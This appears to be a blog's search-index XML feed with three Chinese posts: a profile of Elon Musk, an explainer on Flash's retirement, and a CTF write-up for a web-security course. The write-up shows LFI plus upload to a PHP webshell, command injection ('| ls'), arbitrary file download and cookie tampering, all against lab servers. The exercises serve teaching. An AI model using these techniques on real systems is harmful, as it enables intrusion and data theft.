<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2021 1月 科普好文 - 認識2021新全球首富伊隆·馬斯克</title>
      <link href="/blog/2021/02/24/%E8%AA%8D%E8%AD%982021%E6%96%B0%E5%85%A8%E7%90%83%E9%A6%96%E5%AF%8C%E4%BC%8A%E9%9A%86%C2%B7%E9%A6%AC%E6%96%AF%E5%85%8B/"/>
      <url>/blog/2021/02/24/%E8%AA%8D%E8%AD%982021%E6%96%B0%E5%85%A8%E7%90%83%E9%A6%96%E5%AF%8C%E4%BC%8A%E9%9A%86%C2%B7%E9%A6%AC%E6%96%AF%E5%85%8B/</url>
      
        <content type="html"><![CDATA[<html><head>    <title>認識2021新全球首富伊隆·馬斯克</title>    <style>    .moreinfo{background-color: #CCDDFF;}    .note{color:#003C9D;text-align:right;}    </style></head><body><h1>認識2021新全球首富伊隆·馬斯克</h1><h4>經常出現在各種新聞報導上，馬斯克這個名字絕對不讓人感到陌生，若你對馬斯克還不了解，本文將帶你認識這位在全球地位崇高的科技巨擘。<br><br><div class="moreinfo">想快速認識馬斯克，可觀看影片<a href="https://www.youtube.com/watch?v=o-dv42aY9kw&t=149s">狂人馬斯克的故事：我為什麼創辦 PayPal, 特斯拉, SpaceX？</a></div></h4><h2>從小自學編程</h2><div class="getty embed image" style="background-color:#fff;display:inline-block;font-family:Roboto,sans-serif;color:#a7a7a7;font-size:11px;width:100%;max-width:509px;"><div style="padding:0;margin:0;text-align:left;"><a href="http://www.gettyimages.hk/detail/1128730921" target="_blank" style="color:#a7a7a7;text-decoration:none;font-weight:normal !important;border:none;display:inline-block;">Embed from Getty Images</a></div><div style="overflow:hidden;position:relative;height:0;padding:66.60118% 0 0 0;width:100%;"><iframe src="//embed.gettyimages.com/embed/1128730921?et=H7_k942-RsJ8n68p59Ee2A&tld=hk&sig=aVo_MzssSsUoulY1DlPNmADaA7yEhCyer9eJ8Su4CIw=&caption=true&ver=1" scrolling="no" frameborder="0" width="509" height="339" style="display:inline-block;position:absolute;top:0;left:0;width:100%;height:100%;margin:0;"></iframe></div></div><h4 class="note">(圖為示意圖，非馬斯克本人)</h4><h4>父親是一位電動機械工程師的馬斯克，小時候就沉迷於科幻小說，愛打遊戲的他對與電腦有關的事物很有興趣，遊戲使他想學習如何為電腦編程自行開發遊戲。在年僅10歲時有了人生中第一台電腦，自學編程直到12歲時，便以500美元出售了一款自寫的商業軟體。<br><br>然而，在大家眼中前途一片光明的馬斯克，卻和一般人一樣，在小時候都不知道自己未來要做什麼。直到他看到了以科幻小說聞名的作家<a href="https://zh.wikipedia.org/zh-tw/%E4%BA%9E%E7%91%9F%C2%B7%E6%9F%A5%E7%90%86%E6%96%AF%C2%B7%E5%85%8B%E6%8B%89%E5%85%8B">亞瑟·克拉克</a>的一句話，「最先進的科技看起來就像魔法」，激起馬斯克想發展最新科技的念頭。</h4><h2>創辦三間公司PayPal，SpaceX，Tesla</h2><h4>創業的最一開始，馬斯克和弟弟攜手創辦了一家軟件公司<a href="https://zh.wikipedia.org/zh-tw/Zip2">Zip2</a>，創辦資金主要由其父親資助，Zip2提供廣告商和使用者之間的互通平台，當時許多知名企業都成為Zip2的客戶。然而因合併問題，馬斯克最終被迫辭去董事長職位，Zip2也在創立4年後被<a href="https://zh.wikipedia.org/wiki/%E5%BA%B7%E6%9F%8F">康柏電腦</a>收購。</h4><h3>PayPal</h3><div class="getty embed image" style="background-color:#fff;display:inline-block;font-family:Roboto,sans-serif;color:#a7a7a7;font-size:11px;width:100%;max-width:507px;"><div style="padding:0;margin:0;text-align:left;"><a href="http://www.gettyimages.hk/detail/476464157" target="_blank" style="color:#a7a7a7;text-decoration:none;font-weight:normal !important;border:none;display:inline-block;">Embed from Getty Images</a></div><div style="overflow:hidden;position:relative;height:0;padding:66.66667% 0 0 0;width:100%;"><iframe src="//embed.gettyimages.com/embed/476464157?et=SKc4HCEoQ_JYrTt6fOQbNA&tld=hk&sig=7YHxBoydjTlR6iKY6bccyXyX2sVWQq2-t2OhZP6Ddz8=&caption=true&ver=1" scrolling="no" frameborder="0" width="507" height="338" style="display:inline-block;position:absolute;top:0;left:0;width:100%;height:100%;margin:0;"></iframe></div></div><h4>賣掉Zip2後的馬斯克，利用人生中的第一桶金與他人共同創立了一家在線金融服務和電子支付業務公司<a href="https://www.bnext.com.tw/article/45311/musk-became-x.com-new-owner">X.com</a>(連結為馬斯克買回域名的相關新聞)，與當時的競爭對手Paypal因服務項目與功能相近，導致兩者競爭激烈，之後由於競爭成本過高，兩公司經協商後決定合併為<a href="https://zh.wikipedia.org/zh-tw/PayPal">PayPal</a>，成為當時最大的支付平台。<br><br>雖然合併後的PayPal立刻融資了一億美元，然而兩公司的團隊在合作中有許多理念上的衝突，最後使原PayPal的CEO<a href="https://zh.wikipedia.org/zh-tw/%E5%BD%BC%E5%BE%97%C2%B7%E6%B3%B0%E7%88%BE">彼得·提爾</a>選擇離開PayPal，並由馬斯克接任CEO的職位。<br><br>然而其後公司內的衝突並不停歇，馬斯克的行為引發員工們的不滿，最後遭彈劾而正式辭去CEO的職位，PayPal再次由彼得·提爾帶領，而離開公司的馬斯克仍對PayPal貢獻許多心力。</h4><h3>SpaceX</h3><div class="getty embed image" style="background-color:#fff;display:inline-block;font-family:Roboto,sans-serif;color:#a7a7a7;font-size:11px;width:100%;max-width:594px;"><div style="padding:0;margin:0;text-align:left;"><a href="http://www.gettyimages.hk/detail/914642586" target="_blank" style="color:#a7a7a7;text-decoration:none;font-weight:normal !important;border:none;display:inline-block;">Embed from Getty Images</a></div><div style="overflow:hidden;position:relative;height:0;padding:66.66667% 0 0 0;width:100%;"><iframe src="//embed.gettyimages.com/embed/914642586?et=ya9eWONJQwFhY94MDgYQcQ&tld=hk&sig=DmnLn7cH4jEReAaymjmCikqdGg6fAZvHvHoHkgEnHIo=&caption=true&ver=1" scrolling="no" frameborder="0" width="594" height="396" style="display:inline-block;position:absolute;top:0;left:0;width:100%;height:100%;margin:0;"></iframe></div></div><h4>馬斯克曾思考有那些問題可能對人類未來有重大的影響，最大的問題便是地球的永續發展，再來則是「將生命延續到地球以外的地方」，第二個想法便成為馬克斯創立<a href="https://zh.wikipedia.org/zh-tw/SpaceX">SpaceX</a>的基礎。<br><br>SpaceX是美國的民營航太製造商兼太空運輸公司，也是馬斯克成立的第三家公司，以降低太空運輸的成本為公司的理念。</h4><h3>Tesla</h3><div class="getty embed image" style="background-color:#fff;display:inline-block;font-family:Roboto,sans-serif;color:#a7a7a7;font-size:11px;width:100%;max-width:594px;"><div style="padding:0;margin:0;text-align:left;"><a href="http://www.gettyimages.hk/detail/1133038736" target="_blank" style="color:#a7a7a7;text-decoration:none;font-weight:normal !important;border:none;display:inline-block;">Embed from Getty Images</a></div><div style="overflow:hidden;position:relative;height:0;padding:71.21212% 0 0 0;width:100%;"><iframe src="//embed.gettyimages.com/embed/1133038736?et=s9cSobNNQ_FDD3rPwFHkyA&tld=hk&sig=JadEPzpV7znIGjoDD_UskgK-_JQ0u8auiHLANeG0QWc=&caption=true&ver=1" scrolling="no" frameborder="0" width="594" height="423" style="display:inline-block;position:absolute;top:0;left:0;width:100%;height:100%;margin:0;"></iframe></div></div><h4>地球永續發展的問題，則成了建立<a href="https://zh.wikipedia.org/wiki/%E7%89%B9%E6%96%AF%E6%8B%89_(%E5%85%AC%E5%8F%B8)">Tesla(特斯拉)</a>的基礎，特斯拉是目前美國最大的電動汽車公司。<br>馬斯克在33歲時入股特斯拉，35歲時成立<a href="https://zh.wikipedia.org/zh-tw/SolarCity">SolarCity</a>(美國最大的太陽能發電公司)，10年後被特斯拉收購，正式納入特斯拉汽車旗下。<br><br>而馬斯克能在2021年僅一周的時間，超越亞馬遜CEO<a href="https://zh.wikipedia.org/zh-tw/%E6%9D%B0%E5%BC%97%E9%87%8C%C2%B7%E8%B4%9D%E7%B4%A2%E6%96%AF">貝佐斯</a>也是由特斯拉推波助瀾下成就的。<br><br><div class="moreinfo">想知道更多馬斯克和貝佐斯的關係，可參見報導<a href="https://www.bnext.com.tw/article/61154/spacex-starlink-amazon-satellite">地球首富們為宇宙而吵!馬斯克、貝佐斯爭奪衛星軌道，究竟太空商機有多大？</a></div></h4><h3>Neuralink</h3><h4>馬斯克45歲時創立了<a href="https://zh.wikipedia.org/zh-tw/Neuralink">Neuralink</a>，是一家美國神經科技和腦接口公司，曾於2020年8月展示其最新腦機接口技術，成功讀取實驗豬的大腦活動。<br><br><div class="moreinfo">腦機接口技術的大略介紹可參見武陵資研的報導<a href="https://www.instagram.com/p/CE6XLXSFwdx/?utm_source=ig_web_copy_link">Neuralink發表最新腦機接口技術！</a><br>或觀看相關推薦影片<a href="https://www.youtube.com/watch?v=e9BqtSzf2-A">《黑鏡》場景真的要來了嗎？人腦和電腦的結合！Neuralink發表會展示最新黑科技！| 啾啾鞋</a></div></h4><h2>近期馬斯克的奇聞軼事</h2><h3>狗狗幣愛好者</h3><img src="https://pbs.twimg.com/media/EtXfpgGWYAEIa7y?format=jpg&name=small"><h4 class="note">(圖片取自馬斯克2021/2/4在Twitter上的推文)</h4><h4>馬斯克再推特的推文影響力十足，近期發布了一張電影《獅子王》的合成圖(上圖)，馬斯克手上抱著狗狗幣標誌圖上的日本柴犬<br><br><a href="https://zh.wikipedia.org/zh-tw/%E5%A4%9A%E5%90%89%E5%B8%81">多吉幣</a>(Dogcoin)，就是俗稱的狗狗幣，是一種類似比特幣的虛擬貨幣，創立於2013年，其目的並非用於投資，主要是用來給小費表達感謝之意。以其具娛樂性、價格低廉、流通性高，獲得小費文化盛行的美國人喜愛。<br><br><div class="moreinfo">更多關於狗狗幣創立的報導請見<a href="https://www.bnext.com.tw/article/47706/cryptocurrency-dogecoin-now-has-a-market-value-of-more-than-1-billion">無厘頭創立的「狗狗幣」，市值飆近20億美元，連創辦人都嚇一跳</a></div><br></h4><h3>語音社群平台Clubhouse</h3><img src="https://upload.wikimedia.org/wikipedia/zh/4/4a/Clubhouse_icon.jpg"><h4 class="note">(圖片取自Clubhouse維基百科)</h4><h4>地位崇高的馬斯克做什麼都會引人關注，最近馬斯克開始使用最近爆紅的語音社群平台<a href="https://zh.wikipedia.org/wiki/Clubhouse">Clubhouse</a>，在平台中暢談自己的事業，房間立刻湧入大批聽眾，使得Clubhouse更為人所知。<br><br><div class="moreinfo">想更認識Clubhouse可看推薦影片<a href="https://www.youtube.com/watch?v=sSf0M9RWiWQ">Clubhouse突然爆紅？只能用聲音的社群app有什麼吸引人的魔力？《 好奇七七探索日記 》EP019｜志祺七七</a></div></h4><h3>馬斯克小孩的名字</h3><img src="https://attach.setn.com/newsimages/2020/05/06/2539545-XXL.jpg"><h4 class="note">(圖片取自馬斯克推特)</h4><h4>馬斯克總有異於常人的想法，其中，對自己的小孩也不例外。馬斯克在2020年5月月於Twitter上宣布小孩成功出生的消息，也宣布其孩子的名字為「X Æ A-12 Musk」，引起網友們熱烈討論。隨後馬斯克的老婆，加拿大歌手<a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E8%8E%B1%E5%A7%86%E6%96%AF">格萊姆斯</a>也在Twitter上說明小孩名字的涵義。<br><br>同樣特別的是，夫妻兩人表示他們不會對其孩子定下性別，一切都讓孩子在成長過程中自行定義。<br><br><div class="moreinfo">好奇馬斯克夫婦小孩名字的涵義可參考報導<a href="https://buzzorange.com/techorange/2020/05/06/x-ae-a-12-musk/">「X Æ A-12 Musk」：馬斯克剛誕生的小孩名字怎麼念？</a></div></h4><h3>星鏈計畫</h3><div class="getty embed image" style="background-color:#fff;display:inline-block;font-family:Roboto,sans-serif;color:#a7a7a7;font-size:11px;width:100%;max-width:594px;"><div style="padding:0;margin:0;text-align:left;"><a href="http://www.gettyimages.hk/detail/1211085521" target="_blank" style="color:#a7a7a7;text-decoration:none;font-weight:normal !important;border:none;display:inline-block;">Embed from Getty Images</a></div><div style="overflow:hidden;position:relative;height:0;padding:66.66667% 0 0 0;width:100%;"><iframe src="//embed.gettyimages.com/embed/1211085521?et=x2eB8xvMSLp5uHu5kLQNwg&tld=hk&sig=ezbCAvO8PFcmdhq-ARt0R6Tk1OX6cl4zUhS0gtvtjJE=&caption=true&ver=1" scrolling="no" frameborder="0" width="594" height="396" style="display:inline-block;position:absolute;top:0;left:0;width:100%;height:100%;margin:0;"></iframe></div></div><h4>馬斯克在2015年以SpaceX執行長的身分宣布推出<a href="https://zh.wikipedia.org/zh-tw/%E6%98%9F%E9%93%BE">星鏈計畫</a>，以提供全球人民使用高速網際網路服務為目標，也希望可以開發出「全球衛星網路系統」，並將其應用在其他星球的環境上。<br><br>星鏈計畫仍在進行，且近期實行得如火如荼，網路上充滿了星鏈計畫的新聞，對此計畫有興趣的人可以多加關注相關消息!<br><br><div class="moreinfo">更多有關星鏈計畫的介紹可參考報導<a href="https://www.storm.mg/article/2890880?mode=whole">衛星和你想的不一樣：別再說星鏈計畫是6G了！</a></div></h4><h2>結論</h2><h4>看完上文對馬斯克的介紹後，有沒有增加你對這位科技巨擎的了解了呢?網路上馬斯克的相關新聞不可勝數，絕對能夠滿足你想更認識馬斯克的心!</h4></body></html>]]></content>
      
      
      <categories>
          
          <category> Scientific-knowledge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科普好文 </tag>
            
            <tag> Musk </tag>
            
            <tag> 2021 2月 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 1月 科普好文 - 為甚麼flash被淘汰</title>
      <link href="/blog/2021/01/28/%E7%82%BA%E7%94%9A%E9%BA%BCflash%E8%A2%AB%E6%B7%98%E6%B1%B0/"/>
      <url>/blog/2021/01/28/%E7%82%BA%E7%94%9A%E9%BA%BCflash%E8%A2%AB%E6%B7%98%E6%B1%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="為甚麼flash被淘汰"><a href="#為甚麼flash被淘汰" class="headerlink" title="為甚麼flash被淘汰"></a>為甚麼flash被淘汰</h1><h2 id="Flash是甚麼"><a href="#Flash是甚麼" class="headerlink" title="Flash是甚麼"></a>Flash是甚麼</h2><ul><li>是一種瀏覽器外掛程式。</li><li>為Adobe公司旗下的軟體，Flash創作程式與網頁多媒體播放器均可稱為Flash。</li><li>使用點陣圖和向量圖形技術，並以ActionScript指令碼語言進行編程製作。</li></ul><h2 id="Flash的功用"><a href="#Flash的功用" class="headerlink" title="Flash的功用"></a>Flash的功用</h2><h3 id="1-網頁多媒體撥放程式"><a href="#1-網頁多媒體撥放程式" class="headerlink" title="1. 網頁多媒體撥放程式"></a>1. 網頁多媒體撥放程式</h3><ul><li>可撥放網頁上的二維動畫及影片。</li><li>支援雙向視訊流和音訊流。</li></ul><h3 id="2-節省網頁的下載時間及頻寬"><a href="#2-節省網頁的下載時間及頻寬" class="headerlink" title="2. 節省網頁的下載時間及頻寬"></a>2. 節省網頁的下載時間及頻寬</h3><ul><li>使用向量圖形的技術來最小化文件。</li></ul><h3 id="3-增強滑鼠控制與網頁上相對座標功能"><a href="#3-增強滑鼠控制與網頁上相對座標功能" class="headerlink" title="3. 增強滑鼠控制與網頁上相對座標功能"></a>3. 增強滑鼠控制與網頁上相對座標功能</h3><ul><li>針對第一人稱視角類型網頁加強滑鼠功能。</li></ul><h3 id="４-Adobe-Flash-Player"><a href="#４-Adobe-Flash-Player" class="headerlink" title="４. Adobe Flash Player"></a>４. Adobe Flash Player</h3><ul><li>簡化開發過程。</li><li>提高性能。</li><li>有更高的安全性。</li></ul><h3 id="5-Stage3D的加速圖形渲染"><a href="#5-Stage3D的加速圖形渲染" class="headerlink" title="5. Stage3D的加速圖形渲染"></a>5. Stage3D的加速圖形渲染</h3><ul><li>能有互動體驗類型網頁的開發。</li></ul><h2 id="Flash的歷史"><a href="#Flash的歷史" class="headerlink" title="Flash的歷史"></a>Flash的歷史</h2><ul><li>1995年，FutureWave公司在Flash的前身-SmartSketch的基礎上增加網頁向量動畫製作功能，並以FutureSplash Animator為名發表。</li><li>1996年，Macromedia公司收購了FutureWave公司，FutureSplash Animator軟體更名為Macromedia Flash。</li><li>2005年，Adobe公司收購了Macromedia公司，Flash軟體正式納入Adobe公司旗下。</li><li>2017年7月26日，Adobe公司宣布將終結Flash，並於2020年停止開發Flash。</li><li>2020年12月31日，終止對Flash Player的支援與更新。</li></ul><h2 id="Flash的資安漏洞"><a href="#Flash的資安漏洞" class="headerlink" title="Flash的資安漏洞"></a>Flash的資安漏洞</h2><h3 id="1-攻擊者可在受害系統上執行任意程式碼，獲取系統控制權限。"><a href="#1-攻擊者可在受害系統上執行任意程式碼，獲取系統控制權限。" class="headerlink" title="1. 攻擊者可在受害系統上執行任意程式碼，獲取系統控制權限。"></a>1. 攻擊者可在受害系統上執行任意程式碼，獲取系統控制權限。</h3><ul><li>攻擊者可利用其中含有Flash攻擊代碼的ActiveX物件的惡意Word文件進行攻擊，當開啟該惡意Word文件後，即可取得系統控制權限，被利用來散布FinSpy等間諜惡意軟體，進行APT攻擊用途。</li><li>位於Flash的com.adobe.tvsdk中。</li></ul><h3 id="2-攻擊者可設置惡意swf檔文件至網頁中，使受害系統感染。"><a href="#2-攻擊者可設置惡意swf檔文件至網頁中，使受害系統感染。" class="headerlink" title="2. 攻擊者可設置惡意swf檔文件至網頁中，使受害系統感染。"></a>2. 攻擊者可設置惡意swf檔文件至網頁中，使受害系統感染。</h3><ul><li><p>受害系統瀏覽網頁或電子郵件或使用其他含有Flash Player的應用程式，都可能受到感染。因不需進行互動就可能受感染，若有一個惡意的swf檔被放在一個熱門網站上，就有可能造成大規模的感染。</p><p>  <em>swf檔，為Shockwave Flash的縮寫，是一個無法被編輯的視訊檔。swf在發布時可以選擇保護功能。然而保護功能依然阻擋不了為數眾多的破解軟體。</em></p></li></ul><p><del>若對駭進Flash有興趣，請參考這篇文</del><br><a href="https://www.freebuf.com/vuls/162369.html">https://www.freebuf.com/vuls/162369.html</a></p><h3 id="讓Flash存在一堆漏洞的原因"><a href="#讓Flash存在一堆漏洞的原因" class="headerlink" title="讓Flash存在一堆漏洞的原因"></a>讓Flash存在一堆漏洞的原因</h3><h4 id="1-有大量的用戶"><a href="#1-有大量的用戶" class="headerlink" title="1.有大量的用戶"></a>1.有大量的用戶</h4><ul><li>攻擊者可利用龐大的用戶群體來進行攻擊。</li></ul><h4 id="2-大多數用戶不定期更新軟體"><a href="#2-大多數用戶不定期更新軟體" class="headerlink" title="2.大多數用戶不定期更新軟體"></a>2.大多數用戶不定期更新軟體</h4><ul><li>使用者可能未正確完成更新，或在不理會更新提示。</li></ul><h4 id="3-攻擊者開發攻擊Flash路徑已久"><a href="#3-攻擊者開發攻擊Flash路徑已久" class="headerlink" title="3.攻擊者開發攻擊Flash路徑已久"></a>3.攻擊者開發攻擊Flash路徑已久</h4><h4 id="4-保證兼容性"><a href="#4-保證兼容性" class="headerlink" title="4.保證兼容性"></a>4.保證兼容性</h4><h4 id="5-為不開源軟體"><a href="#5-為不開源軟體" class="headerlink" title="5.為不開源軟體"></a>5.為不開源軟體</h4><ul><li>為Adobe公司獨立維護，但因非為賺錢項目所以對維護Flash不用心</li><li>若Flash有漏洞時，瀏覽器廠商需等Adobe修復</li></ul><h2 id="Flash被時代淘汰的原因"><a href="#Flash被時代淘汰的原因" class="headerlink" title="Flash被時代淘汰的原因"></a>Flash被時代淘汰的原因</h2><h3 id="1-安全性太低"><a href="#1-安全性太低" class="headerlink" title="1.安全性太低"></a>1.安全性太低</h3><h3 id="2-計算資源使用效率低"><a href="#2-計算資源使用效率低" class="headerlink" title="2.計算資源使用效率低"></a>2.計算資源使用效率低</h3><ul><li>HTML5和Web Assembly等網頁互動開源技術，比Flash運行更快、更省電。</li></ul><h3 id="3-蘋果與google大多數產品不再支援"><a href="#3-蘋果與google大多數產品不再支援" class="headerlink" title="3.蘋果與google大多數產品不再支援"></a>3.蘋果與google大多數產品不再支援</h3>]]></content>
      
      
      <categories>
          
          <category> Scientific-knowledge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科普好文 </tag>
            
            <tag> flash </tag>
            
            <tag> 2021 1月 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020/10/24 Web Security 基礎 題解</title>
      <link href="/blog/2020/10/27/2020%20SCIST%20Web/"/>
      <url>/blog/2020/10/27/2020%20SCIST%20Web/</url>
      
        <content type="html"><![CDATA[<h1 id="Web-Getting-Started"><a href="#Web-Getting-Started" class="headerlink" title="Web_Getting Started"></a>Web_Getting Started</h1><h2 id="Redirect"><a href="#Redirect" class="headerlink" title="Redirect"></a>Redirect</h2><p>點進去會有一個網站<br>有個連結按下去說可以看 flag<br>按下去會發現他跳轉一下<br>但什麼事情都沒發生</p><p>所以我們用 curl 觀察一下</p><p><img src="https://i.imgur.com/U2BdeJS.png"></p><p>觀察到那個連結是確實會導向 <code>flag.php</code> 的<br>但貌似又會跳轉回來</p><p>所以我們再用 curl 觀察一下</p><p><img src="https://i.imgur.com/dDyHf4a.png"></p><p>發現就會有 flag 了</p><p>會跳轉的原因是 <code>flag.php</code> 設定為會 302 跳轉回到 / 下<br>所以瀏覽器才會看不到內容<br>不過我們可以用 curl 去把 browse <code>flag.php</code> 的 response 抓下來<br>這樣就可以不被跳轉的看到內容了</p><h2 id="Form"><a href="#Form" class="headerlink" title="Form"></a>Form</h2><blockquote><p>解法一 </p></blockquote><p>點進網址後，根據提示輸入 <code>123</code>，發現被擋住了</p><p><img src="https://i.imgur.com/vBh29PS.png"></p><p>透過 Chrome 的開發者工具(<code>右鍵&gt;檢查</code>)，發現送出 <code>123</code> 會被 <code>javascript</code> 擋住</p><p><img src="https://i.imgur.com/3shM31P.png"></p><p>點選 <code>form</code> 元素，在下方的 <code>Event Listeners</code> 可以把 <code>onsubmit</code> 註冊的 <code>return checkForm(this)</code> 移除</p><p><img src="https://i.imgur.com/SdwMhzr.png"></p><p>再次送出就可以得到 flag</p><p><img src="https://i.imgur.com/WIyTOiB.png"></p><blockquote><p>解法二</p></blockquote><p>觀察一下他的 input name 跟 method<br><code>name = pw method = POST</code></p><p>可以用 curl 送出資料且不觸發到 JavaScript</p><p><code>curl -d &quot;pw=123&quot; http://140.110.112.78:10204/</code></p><blockquote><p>解法三</p></blockquote><p>打開 Chrome 的 Develope tool<br>先在 form 上面打 123<br>接著在 Develope tool 輸入 <code>document.querySelector(&#39;form&#39;).submit()</code></p><p><img src="https://i.imgur.com/CwER3YA.png"></p><p>這樣就會直接 submit form 裡面的東西 且不會觸發到 onsubmit 的 Js</p><h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><p>進入網址後，會有三個連結，先傳個檔案上去試試看</p><p><img src="https://i.imgur.com/cM5cW7J.png"></p><p>點進那個連結，會發現我們的檔案路徑為 <code>/files/&lt;hash&gt;/&lt;hash&gt;.txt</code></p><p><img src="https://i.imgur.com/I0j56sT.png"></p><p>回到最一開始的 ?page 那邊，依照他讀取的方式 可以隨意測試一下讀取其他東西</p><p><img src="https://i.imgur.com/Xhbvpkd.png"></p><p>觀察一下，就會發現這個網站存在 LFI 的漏洞<br>從錯誤頁面的截圖，和上傳一個檔案後所存在的路徑，就可以知道檔案的目錄結構</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">|-- index.php</span><br><span class="line">|-- modes</span><br><span class="line">    |-- home</span><br><span class="line">    |-- about</span><br><span class="line">    &#96;-- files</span><br><span class="line">&#96;-- files</span><br><span class="line">    &#96;-- &#123;hash1&#125;</span><br><span class="line">         &#96;-- &#123;hash2&#125;.txt   </span><br></pre></td></tr></table></figure><p>透過 LFI 漏洞和檔案上傳就可以得到 <code>SHELL</code></p><p>簡單的 php shell 程式碼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`$_GET[<span class="number">1</span>]`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>http://140.110.112.78:10210/?page=../files/&#123;hash1&#125;/&#123;hash2&#125;.txt&amp;1=&#123;command&#125;</code></p><p>透過 <code>ls</code> 指令可以知道 flag 在 <code>flag_xxxxxx.txt</code></p><p><img src="https://i.imgur.com/IV5ORba.png"></p><p>直接訪問 <code>http://140.110.112.78:10210/flag_xxxxxx.txt</code> 即可得到 <code>flag</code></p><p><img src="https://i.imgur.com/o5mwrkA.png"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="KAIBRO-BUY"><a href="#KAIBRO-BUY" class="headerlink" title="KAIBRO BUY"></a>KAIBRO BUY</h2><p><code>http://140.110.112.78:2500/</code></p><p>我們現在有 1000 元，但是要買到 flag 需要 99999999 元<br><img src="https://i.imgur.com/ExTGae7.png"></p><p>對數字點右鍵，選擇檢查<br><img src="https://i.imgur.com/mTwtK4J.png"></p><p>雖然數字本身是不能改的，但是發現到數字是直接寫在前端的，所以我們可以從 Develope tool 更改成任意值</p><p><img src="https://i.imgur.com/XyBatCK.png"></p><p>賺ww<br><img src="https://i.imgur.com/WUn8eu8.png"></p><h2 id="Level"><a href="#Level" class="headerlink" title="Level"></a>Level</h2><p>題目是要我們達到 level 1000<br>並且我們發現到當點擊 <code>Click me to next level</code> 可以讓 level 加上 1<br><img src="https://i.imgur.com/ZsgL9rB.png"></p><p>當然，你可以很認真地點完這 1000 次<br>不過實際上我們開啟開發者工具檢查一下，會發現到 level 是記錄在 cookie 裡面<br><img src="https://i.imgur.com/ykAoKB9.png"></p><p>所以我們可以直接修改 cookie 的值，接下來重新整理一下頁面就可以拿到 flag 囉!<br><img src="https://i.imgur.com/srTM2sf.png"></p><h2 id="Secret-Login"><a href="#Secret-Login" class="headerlink" title="Secret Login"></a>Secret Login</h2><p>一進來就送我們 source code ，當然要來看一下囉<br><img src="https://i.imgur.com/2lHwEiz.png"></p><p>發現到他會 <code>GET</code> 一個 <code>pass</code> 參數，並拿去跟 config.php 內的 <code>secret</code> 比較</p><p>這邊要用到 php 的小知識: 任何東西和 <code>null</code> 做比較，都會是 <code>true</code></p><p>這邊我們將 pass 以 <code>pass[]</code> 傳過去，這時候的 <code>pass</code> 是一個未定義的陣列，所以會是 <code>null</code></p><p>連結如下: <code>http://140.110.112.78:2502/?pass[]</code></p><p>接下來就拿到 flag 囉!<br><img src="https://i.imgur.com/6wwGz9R.png"></p><p>或是使用 curl</p><p><code> curl -b &quot;level=1000&quot; http://140.110.112.78:25501</code></p><h2 id="Downloader"><a href="#Downloader" class="headerlink" title="Downloader"></a>Downloader</h2><p>進到頁面上可以看到有三個連結，分別會下載到三種不同的怪貓貓<br>檢查原始碼後發現，他會連到 <code>download.php</code> ，並用任意 <code>GET</code> 檔案<br><img src="https://i.imgur.com/cWMJhsO.png"></p><p>這裡就是漏洞所在，現在我們可以透過 <code>download.php</code> 任意下載伺服器上的檔案<br>因為到處猜 flag 猜不到，所以我們就先下載預設就會存在的 <code>index.php</code><br>發現到他 include 了 <code>config.inc.php</code></p><p><img src="https://i.imgur.com/3cNVuog.png"></p><p>那麼就來下載看看吧</p><p><img src="https://i.imgur.com/JAm3gMc.png"></p><h2 id="lightning"><a href="#lightning" class="headerlink" title="lightning"></a>lightning</h2><p>這一題其實在瀏覽過程當中經過了 302 redirect ，所以造成你看不到 flag<br>我們可以藉由 curl 不會被 redirect 的特性來解決</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i http://140.110.112.78:2507/</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/ckaYl9E.png"></p><p>發現到他會把我們先導向到 <code>flag.php</code></p><p>接著 curl flag.php 就可以拿到 flag 了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://140.110.112.78:2507/flag.php</span><br></pre></td></tr></table></figure><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>一進來就看到 source code<br>發現到他會將一串 base64 的編碼 decode 後執行<br><img src="https://i.imgur.com/zhHImZA.png"></p><p>先來看看這串 base64 的內容吧</p><blockquote><p>system($_POST[123]);</p></blockquote><p>意思是他會接收名稱為 <code>123</code> 的 <code>POST</code> ，並且送到 <code>system</code> 執行<br>所以說… 我們可以透過 POST 讓他執行任意指令了!<br>先用 find 來找找 <code>flag</code> 的位置吧!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -d <span class="string">&quot;123=find / -name &quot;</span>flag<span class="string">&quot;&quot;</span> http://140.110.112.78:2508/</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/O0FvSjM.png"></p><p>找到位置後，直接 cat 出來就可以拿到 flag 了</p><h2 id="Cat-Digger"><a href="#Cat-Digger" class="headerlink" title="Cat Digger"></a>Cat Digger</h2><p>這題是 command injection<br>可以發現他會將我們輸入的內容送去執行 dig ，並且將結果輸出到網頁上</p><p>但是因為沒有針對我們的輸入做任何 filter ，我們可以直接截斷 dig 的指令，而去執行我們指定的內容</p><p>例如 輸入 <code>| ls</code> ，就會如實執行</p><blockquote><p>bootstrap.css<br>index.php</p></blockquote><p>所以，跟上一題相同，我們可以先用 find 找到 flag 的位置，最後 cat 出來即可<br>不過這題會檔輸入 <code>flag</code> <code>cat</code> ，所以需要一點跳脫</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| find / -name <span 